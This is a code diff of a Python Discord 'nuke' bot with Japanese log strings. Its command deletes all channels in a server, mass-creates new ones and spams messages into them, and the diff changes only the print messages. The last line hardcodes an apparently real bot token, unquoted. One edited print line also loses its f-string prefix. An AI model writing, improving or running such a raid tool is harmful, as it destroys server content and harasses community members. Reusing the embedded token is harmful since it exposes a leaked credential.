@@ -18,18 +18,18 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f"ログイン成功ログログ: {bot.user}")
+    print("ログイン成功！: {bot.user}")
 
 @bot.command()
 async def nuke(ctx):
     guild = ctx.guild
     await ctx.message.delete()
 
-    print(" チャンネル削除ログ")
+    print("チャンネルを削除しました！")
     delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    print(" チャンネル作成ログ")
+    print("チャンネル作成中")
     new_channels = []
     for i in range(0, 60, 15):
         tasks = [
@@ -42,7 +42,7 @@ async def nuke(ctx):
                 new_channels.append(r)
         await asyncio.sleep(1)  
 
-    print(" スパムログ")
+    print("ｽﾊﾟﾑを開始")
     async def spam(ch):
         for _ in range(60):
             try:
@@ -52,6 +52,6 @@ async def nuke(ctx):
                 await asyncio.sleep(2)
 
     await asyncio.gather(*(spam(ch) for ch in new_channels))
-    print("✅ nuke完了ログ")
+    print("nukeの完了")
 
 bot.run(MTM4NzM0MDI1OTM2NDMwNjk0NA.G7Pva9.qqVy10GaCuoMd-7pWuoS4-IDo3aeuugWx1KkjA)
